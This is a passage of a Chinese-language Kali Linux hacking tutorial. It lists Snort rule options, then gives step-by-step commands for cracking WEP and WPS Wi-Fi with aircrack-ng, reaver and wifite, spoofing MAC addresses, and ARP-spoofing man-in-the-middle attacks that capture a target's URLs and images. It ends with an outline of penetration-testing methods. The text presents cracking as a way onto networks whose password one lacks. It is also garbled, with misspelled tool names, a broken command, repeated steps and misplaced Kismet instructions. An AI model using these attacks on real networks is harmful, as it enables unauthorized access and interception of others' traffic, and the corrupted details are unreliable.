    描述：这两个参数与 John 的内部大脑有关，与漏洞本身没有直接关系，因此未作介绍。


    Snort 是一款在 Kali Linux 中可用的开源软件，以其用 C 语言编写入侵检测系统（NIDS）而闻名。它支持 Windows 和 Linux 平台，我更倾向于
    Linux 操作系统，因此学习了在 Linux 上研究 Snort。Snort 有三种运行模式，包括嗅探、数据包记录和入侵检测。


    ## Snort 规则选项


    所有的 Snort 规则选项都用分号 `;` 分隔。规则选项关键字及其参数之间用冒号 `:` 分隔。根据这种方法，Snort 中有 42 个规则选项关键字，它们可以帮助我们执行嗅探和记录数据包等各种操作。我们使用
    Snort 能够做的事情是无上限的，因为它非常复杂且实用。


    - `Msg` - 在数据包日志中打印消息。

    - `Logto` - 将数据包记录到用户定义的文件，而不是记录到标准格式。

    - `Ttl` - 检查 IP 头中 `ttl` 的值。

    - `Tos` - 检查 IP 头中 `TOS` 字段的值。

    - `Id` - 检查 IP 头中的分段 `id` 值。

    - `Ipoption` - 查看 IP 选项字段的特定编码。

    - `Fragbits` - 检查 IP 头的分段位。

    - `Dsize` - 检查数据包负载大小的值。

    - `Flags` - 检查 TCP 标志的值。

    - `Seq` - 检查 TCP 序列号的值。

    - `Ack` - 检查 TCP 响应（确认）的值。

    - `Window` - 测试 TCP 窗口字段的特殊值。

    - `Iype` - 检查 ICMP 类型。

    - `Icode` - 检查 ICMP 代码。

    - `Icmp_id` - 检查 ICMP ECHO ID 值。

    - `Icmp_seq` - 检查 ICMP ECHO 序列号的值。

    - `Content` - 在数据包负载中搜索指定的样式。

    - `Content-list` - 在数据包负载中搜索一组模式。

    - `Offset - content` - 选项的修饰符，设置开始搜索的位置。

    - `Depth - content` - 选项的修饰符，设置搜索的最大深度。

    - `Nocase` - 指定内容字符串不区分大小写。

    - `Session` - 记录指定会话的应用层信息。

    - `Rpc` - 监控特定应用程序/进程调用的 RPC 服务。

    - `Resp` - 积极响应（断开连接等）。

    - `React` - 响应动作（阻止网站）。

    - `Reference` - 外部攻击参考 ID。

    - `Sid` - Snort 规则 ID。

    - `Rev` - 规则的版本号。

    - `Classtype` - 规则分类标识符。

    - `Priority` - 规则优先级数字。

    - `Uricontent` - 在数据包的 URI 部分搜索内容。

    - `Tag` - 规则的高级记录行为。

    - `Ip_proto` - IP 协议字段值。

    - `Sameip` - Determine 源 IP 和目标 IP 是否相等。

    - `Stateless` - 忽略流状态的有效性。

    - `Regex` - 通配符模式匹配。

    - `Within` - 强制关系模式匹配的范围。

    - `Byte_test` - 数字模式匹配。

    - `Byte_jump` - 数字模式测试和偏移调整。


    ## Snort 基础命令


    1) `start snort`：`Sudo snort`

    2) `snort help` 命令：`snort --help`

    3) Snort 启动特定的配置文件：

    ```bash

    sudo snort -i eth0 –c /example/snortexample/snort.conf -A fast -l /var/log/snort

    ```

    4) 规则：

    ```bash

    alert tcp any any -> 10.232.2.1 80 (msg:"Telnet Login";sid:23434)

    alert icmp any any -> 10.232.2.1 any (msg:"ICMP PING";sid:8845463)

    ```


    以上就是 Kali Linux 提供的高级黑客工具的全部。在下一章中，我们将详细讨论无线攻击。在进行无线攻击之前，尝试练习本章中学到的的内容。你可以使用像
    Burp suite 这样的 Web 应用分析软件来进一步了解协议和加密过程，成为一名高效的黑客。


    ## 第 5 章：无线攻击与渗透测试


    本章将详细解释使用 Kali Linux 可以进行的无线攻击。首先，我们将简要介绍不同的以分析网络数据包而闻名的无线网络分析工具。在下一节中，我们将介绍 Aircrack-ng，这是一种
    Kali Linux 无线工具，用于破解某些加密的 WiFi 密码。


    在当今，几乎每个人都连接到了互联网。特别是如果你经常在路上，你希望随处都有无线信号以便你可以你想做的任何事情。但在许多情况下，这些无线信号在使用之前需要经过身份验证。有时你可能急需网络但不知道其无线密码，这种用户可能会非常焦虑。在
    Kali 中，有很多可用工具可以破解无线网络。本章将描述使用各种渗透工具进行无线网络攻击。


    ### 什么是嗅探？


    嗅探是通过使用黑客工具获取无线数据包的过程。嗅探通常被称为脚本小子（script kiddies）方法，因为用户可以利用嗅探技术骗取密码等敏感信息。Wireshark
    是一种用于无线攻击的著名工具。


    ### 无线网络嗅探工具 Kismet


    如果要进行无线网络渗透测试，必须首先扫描有效的访问点。此时，Kali Linux 提供了 Kismet 这种无线网络嗅探工具。使用该工具测量周围的无线信号。本章描述使用
    Kismet 工具进行无线网络。


    步骤 1：启动 Kismet 工具。执行命令：

    ```bash

    kismet

    ```

    步骤 2：使用 root 用户运行 Kismet 工具。此时选择 Ok。之后，界面会提示“Yes”。

    步骤 3：界面显示设置 Kismet 服务的信息。使用默认设置并选择 Start。

    步骤 4：指定无线网卡接口描述。如果你的无线网卡已处于监听模式，输入 `WLAN0` 或 `MON0` 等信息。然后点击 Add 按钮。

    步骤 5：界面显示正在嗅探无线网络的信号。运行一段时间后，点击屏幕上的 Kismet 菜单并选择 Quit 退出终端。

    步骤 6：Kismet 关闭上述消息，你会看到多个日志文件保存在 Root 下。切换到 Root 目录并使用 `ls` 命令查看日志文件。执行命令：

    ```bash

    ls

    ```

    从输出可以看到 Kismet 生成了不同后缀的文件：

    - `alert`：包含所有警告信息。

    - `gps`：如果使用了 GPS，则相关 GPS 数据保存在文件中。

    - `NET`（或 `nettxt`）：所有文本输出。

    - `XML`：包含 XML 格式的数据。

    - `PCAP`：包含整个会话捕获的数据包。


    ### 分析文本文件


    在 Linux 中，你可以使用各种文本编辑器打开 `nettxt` 文件。从该界面可以看到 `nettxt` 文件包含了大量扫描到的无线网络的信息，每个无线网络都有标签。


    ### Aircrack-ng


    Aircrack-ng 是一种基于 IEEE 802.11 协议的 WEP 和 WPA-PSK 加密工具。该工具主要使用两种攻击方法破解 WEP：一种是 FMS
    攻击，以发现 WEP 漏洞的研究人员命名；另一种是 Kore 攻击，这是一种统计攻击，这种攻击比 FMS 攻击高效得多。本章描述使用 Aircrack-ng
    破解无线网络。


    ### 破解 WEP 加密网络


    Bep 协议是设备间传输数据的加密方式，防止非法用户监听或入侵无线网络。然而，密码分析学家已经发现了 WEP 的多个漏洞，这些漏洞在 2003 年被 WPA
    消除并被 WPA2 取代。本章描述破解 WEP 加密的无线网络。使用 Aircrack 破解 WEP 加密的无线网络的步骤如下：


    1) 使用 `airmon-ng` 命令查看当前系统上的无线接口。执行命令：

    ```bash

    airmon-ng

    ```

    输出信息表明当前系统中有一个无线接口。输出：Interface Chipset Driver Wlan0（在此处获取你的驱动程序）。


    2) 尝试更改 wifi 系统或设备的 mac 地址。因为 MAC 地址识别主机，修改主机 MAC 地址可以隐藏真实的 MAC。在更改 MAC 地址之前需要停止接口。执行命令：

    ```bash

    airmon-ng stop wlan0

    ```

    或者你也可以尝试命令：

    ```bash

    ifconfig wlan0 down

    ```

    执行上述命令后，WLAN0 接口停止。此时你可以更改物理地址（也称为 MAC），并执行命令：

    ```bash

    macchanger --mac 22:33:44:55:66:77 wlan0

    ```

    Permanent MAC: 00:c1:39:76:05:6c (unknown)

    Current MAC: 00:c3:40:77:05:6e (unknown)

    New MAC: 22:33:34:34:23:67 (Hp Inc)

    输出显示了物理设备的永久 MAC 地址、当前 MAC 地址和新 MAC 地址。你可以看到 wlan1 接口的 MAC 地址已被修改。


    有时在使用 `airmon-ng` 启用无线卡时会发生 SIOCSIFFFLAGS: Operation not possible to RF-kill 错误，这是因为
    Linux 中有一个名为 RF-kill 的软件可以关闭未使用的无线设备（如蓝牙）。当用户使用这些设备时，需要手动解锁。执行命令查看所有禁用的设备：

    ```bash

    rfkill list

    ```

    执行上述命令后，禁用的设备已解锁。


    3) 使用 `airodump-ng` 命令定位附近的可用无线网络。执行命令：

    ```bash

    airodump-ng wlan0

    ```

    输出附近的可用无线网络。当你找到用户想要攻击的路由器时，按 C 停止搜索。输出可以看到：

    - BSSID：无线地址

    - PWR：网卡报告的信号强度

    - BEACONS：发布的 Beacon 数量

    - Data：捕获的数据包数量

    - CH：通道（从 Beacons 获取）

    - Essid：所谓的 SSID，如果 SSID 被隐藏则为空

    - Rate：传输速率

    - FRAMES：客户端发送的数据包数量


    4) 使用 `airodump-ng` 捕获指定 BSSID 文件。`airodump-ng` 的常用选项如下：

    - `-c`：指定通道

    - `-w`：指定捕获数据文件名

    - BSSID：指定 BSSID


    5) 打开新终端运行 `aireplay-ng` 命令。`aireplay-ng` 的语法格式如下：

    ```bash

    aireplay-ng -1 0 -a [BSSID] -h [Chosen MAC] -e [ESSID] [Interface]

    ```

    ```bash

    aireplay-ng -d 1 -a [BSSID] -c [Chosen MAC] [Interface]

    ```


    6) 使用 `aireplay-ng` 向路由器发送流量以捕获数据。语法格式：

    ```bash

    aireplay-ng -3 -b [BSSID] -h [Chosen MAC] [Interface]

    ```

    输出是使用 ARP 请求读取 ARP 请求，此时切换到 `airodump-ng` 接口，可以看到帧数增加。捕获一定数量的无线数据包后，如果无效，尝试继续捕获。


    7) 使用 `aircrack-ng` 破解密码：

    ```bash

    aircrack-ng -b [xx] [filename].cap

    ```

    从输出可以看到 KEY FOUND，密码已破解。


    ### WPS (Wi-Fi protected Setup)


    WPS 是由 Wi-Fi 联盟引入的新标准，主要解决无线网络认证问题。因为设置步骤太麻烦，许多人使用 WPS 设置设备。当此功能启用时，攻击者可以攻击 WPS。本章描述使用各种工具攻击
    WPS。


    使用 `reaver` 破解 WPS 的步骤如下：

    1) 插入无线卡并使用 `ifconfig` 查看无线卡是否插入正确。执行命令：

    ```bash

    ifconfig

    ```

    2) 激活无线网卡的监听模式。执行命令：

    ```bash

    airmon-ng wlan0

    ```

    注意：启动上述命令时，确保正确识别无线网卡芯片和驱动，否则无线网卡导致导致失败。


    3) 攻击 WPS。执行命令：

    ```bash

    reaver -i mon0 -b 14:E6:E4:DE:FB:20 -vv

    ```

    输出：从上述输出可以看到正在等待信号连接路由器，并通过发送 PIN 获取密码。如果路由器未启用 WPS，将出现以下信息：

    `[!] WARNING: Failed to associate with 14:E6:E4:DE:FB:20 (ESSID: XXXX)`


    ### Fern wifi cracker


    Fern WiFi Cracker 是测试无线安全的出色工具。该工具用于攻击 Wi-Fi 网络。这里的第一步是使用 FERN Cracker 工具攻击 WPS。


    使用 `wifite` 攻击 WPS 的步骤如下：

    1) 启动 `wifite` 工具并指定密码字典。在命令行终端：

    ```bash

    wifite -dict jesus.txt

    ```

    此信息显示了 Wfinite 工具的版本、支持的平台以及 Wfinite 扫描开始。扫描到你想破解的无线网络时，按 CTRL + C 停止扫描。

    2) 停止扫描无线网络并显示下方消息：从输出可以看到扫描到了五个访问点和三个客户端。输出中总共有七列：指示访问点编号、Essid 号、通道、加密模式、电功率、是否开启
    WPS 以及客户端。如果只有一个客户端连接到访问点，CLIENT 列显示为 CLIENT；如果有多个客户端连接，则显示 clients。

    3) 此时，选择要攻击的访问点。这里选择第五个访问点并输入“1”。然后按回车开始攻击，消息如下：

    `select target numbers (1-5) separated by commas, or ''all'': 1`


    ### GERIX WIFI CRACKER


    Gerix Wifi Cracker 是另一个图形界面无线工具。本章描述如何使用该工具创建伪点。之前，我们介绍了手动使用 `aircrack-ng` 破解
    Wep 和 WPA/WPA2 加密网络。


    ### 使用 Gerix 创建伪点


    使用 Gerix 工具可以创建并建立伪点（AP）。

    ```bash

    root@kali:/usr/share/gerix-wifi-cracker# python gerix.py

    ```

    执行上述命令后，界面出现：

    1) 从该界面可以看到 Gerix 数据库已加载。此时切换到 Configuration 标签页。

    2) 从界面看到只有一个无线接口。现在我们要进行配置。选择接口 `wlan1` 并点击 Enable（启用）按钮。

    3) 从界面看到 `WLAN1` 已启动监听模式。选择 `MON0` 并点击 Rescan（扫描）。

    4) 从界面看到附近的可用无线网络。例如，我们选择了 Essid 为无线网络。

    5) 界面显示正在嗅探信号。运行一段时间后，点击界面上的 Sniffing（嗅探）和 Logging（日志）按钮。点击屏幕上的 Kismet 菜单并选择 Quit
    退出。

    6) Kismet 关闭上述消息，你会看到多个日志文件保存在 Root 下。在这些日志文件中，可以看到 Kismet 运行多次后捕获的数据。

    7) 从该界面可以看到 Kismet 生成的常见时间，用于破解 WEP 密码。


    ### GERIX TO ATTACK


    GERIX TO ATTACK 是一种自动攻击无线网络的工具步骤如下：

    1) 启用转发。执行命令：

    ```bash

    echo 1 >> /proc/sys/net/ipv4/ip_forward

    ```

    2) 设置上述信息后完成默认设置。

    3) 添加防火墙规则进行重定向。执行命令：

    ```bash

    iptables -t nat -A PREROUTING -p tcp --destination 80 -j REDIRECT --to-port 8080

    ```

    上述设置成功后，攻击者控制了网关与目标主机之间的数据。


    ### PORT REDIRECTION ATTACK


    端口重定向也称为端口映射，将数据包（如 80）重定向到不同端口（如 8080）。本章描述使用 `arpsof` 工具实现端口重定向。步骤如下：

    1) 启用转发。执行命令：

    ```bash

    echo 1 >> /proc/sys/net/ipv4/ip_forward

    ```

    2) 使用 `arpsof` 攻击目标主机。方法是攻击者（192.168.6.232）发送 ARP 包欺骗网关（192.168.6.235）和目标主机。首先欺骗目标主机，执行命令：

    ```bash

    arpsof -i eth0 -t 192.168.6.232 192.168.6.235

    ```

    输出攻击者发送到目标主机 192.168.6.232 的数据包。503946:8D 代表攻击者的 MAC 地址；193fe5 代表 192.168.6.235
    的 MAC 地址。当上述过程成功后，目标主机 192.168.6.232 将数据发送到网关 192.168.6.235。

    3) 使用 `ARPSPOOF` 攻击网关。执行命令：

    ```bash

    arpsof -i eth0 - 192.168.6.232 192.168.6.235

    ```

    上述输出显示发送到网关的数据包。


    ### URL MANIPULATION ATTACK


    URL 操控与中间人攻击相似，通过目标主机向互联网注入路由流量。本章描述使用 `arpsof` 工具实现 URL 操控攻击。步骤如下：

    1) 启用转发。执行命令：

    ```bash

    echo 1 >> /proc/sys/net/ipv4/ip_forward

    ```

    2) 使用 `Arpsof` 攻击目标主机。方法是攻击者（192.168.6.232）发送 ARP 包欺骗网关（192.168.6.235）和目标主机。首先欺骗目标主机，执行命令：

    ```bash

    arpsof -i eth0 -t 192.168.6.232 192.168.6.235

    ```

    输出显示攻击者发送到目标主机 192.168.6.232 的包。503946:8D 代表攻击者的 MAC 地址；193fe5 代表 192.168.6.235
    的 MAC 地址。当上述过程成功后，目标主机 192.168.6.232 将数据发送到网关 192.168.6.235。


    ### Capturing and Monitoring Wireless Data


    使用中间人攻击方法，可以将 Kali Linux 操作系统放在目标主机和路由器之间。通过这样，用户可以捕获来自目标主机的所有数据。本章描述如何使用中间人攻击工具捕获和监控无线数据。


    1) 启用路由器转发功能。执行命令：

    ```bash

    echo 1 >> /proc/sys/net/ipv4/ip_forward

    ```

    2) 使用 `arpsof` 命令攻击主机。执行命令：

    ```bash

    arpsof -i eth0 -t 192.168.6.232 192.168.6.235

    ```

    执行上述命令告诉目标主机（目标主机）网关的 MAC 地址是 00。当目标主机接收到消息时会修改 ARP 表中的项。如果不需要攻击，按 CTRL+C 停止。

    3) 查看目标主机的访问 URL 信息。执行命令：

    ```bash

    urlsnarf -i eth0

    ```

    输出显示了目标主机的访问。

    4) 用户也可以使用 `driftnet` 工具捕获由系统图像。执行命令：

    ```bash

    driftnet -i eth0

    ```

    执行上述命令后，窗口打开。输出显示了目标主机的访问。

    5) 现在随机访问网页以生成捕获的数据。执行命令：

    ```bash

    driftnet -i eth0

    ```

    输出显示了目标主机的访问。

    6) 界面显示 `DRIFTNET` 命令：

    ```bash

    driftnet -i eth0

    ```

    执行上述命令后，日志文件保存在 Root 下，文件名为 `driftnet-*`。

    7) 用户可以使用 Linux 查看器查看。


    ## Penetration testing


    我们知道专业的黑客也称为渗透测试人员。他们通常为公司使安全性更好。渗透测试遵循特定的策略和指南，类似于其他方法。


    ### 目的、程序和方法


    如前文所述，渗透测试是委托白帽黑客进行攻击，根据需要限制攻击范围。渗透测试（Penetration Test）旨在发现资产并提供适当风险管理。


    ### 为什么公司或组织需要渗透测试？


    当信息系统上线服务时，黑客会继续尝试攻击。通过渗透测试，所有者可以：

    - 理解信息不当泄露

    - 网络架构设计问题

    - 防火墙设置问题

    - 系统漏洞

    - 应用程序设置问题

    - 理解网络强度

    - 评估入侵者的对等能力

    - 评估渗透

    - 安全策略的执行

    - 减少入侵后的损失


    ### 测试方法


    - **单系统**：例如，提供特定服务的网站，由于支持许多系统，主要攻击受限于网站。

    - **服务器或主机**：对于提供一个或多个服务的设备或计算机，方法取决于提供的服务类型。

    - **分段或主机**：有时特定的网站或服务器容易实施，由于区域的原因，每个系统的防御机制可能不均，作为跳板达到攻击。

    - **全系统**：测试组织的所有相关系统。概念与分段或主机相同。当测试范围更大，可以看到更好的保护能力。

    - **人员安全**：信息系统或应用程序通常由专门人员处理。在安全意识上，人员应高于平均水平。通过社会工程获取基本（甚至高级）权限。

    - **所有机构**：当组织开放所有资产时，这种情况最接近黑客攻击，因为渗透测试范围太广，少数机构会处理组织的渗透测试。

    - **健康检查不是攻击**：渗透测试是为了尽早发现现有漏洞。作为改进的基础，渗透测试的实施必须考虑系统的持续运行，并提前为系统准备应对措施。

    - **审计不是偷窃**：渗透测试是确认组织安全策略执行的审计行为。测试完成后，相关信息必须完全交给卖家，作为持续改进安全的策略参考。

    - **保护是测试的目的**：渗透测试发现的漏洞，测试人员必须为客户提出相应的保护措施。处理渗透测试的操作通常称为 A 方，B 方负责执行渗透测试。


    - **黑盒测试**：B 只知道被测试目标的名称或 URL。其他信息必须在测试活动期间自行收集。使用黑盒测试是测试 B 的黑客技能，因为这种模式最接近真实的攻击。

    - **白盒测试**：A 将尽可能提供目标信息，以便 B 专注于寻找被测试系统的弱点，并使用白盒测试测试系统的保护能力。

    - **灰盒测试**：当然，有时 A 不提供被测试系统（如外包系统）的完整信息。B 无法提前获取系统信息，但 A 仍协助 B 获取尽可能等的信息。处于黑盒和白盒之间。

    - **双黑盒**：有时 A 希望在模拟黑客攻击的范围内尽可能测试。不仅要测试系统的保护能力，还要测试自身人员的警惕性或弹性。秘密委托 B 进行渗透操作，相关人员不知道渗透测试，B
    无法获得被测试系统的详细信息。因此，进攻双方在黑暗中竞争，所以被称为双黑盒（或双盲）。

    - **双白盒**：与双黑盒相反，双方都知道彼此的存在，主要目的是协助 B。A 发现并确认系统漏洞。


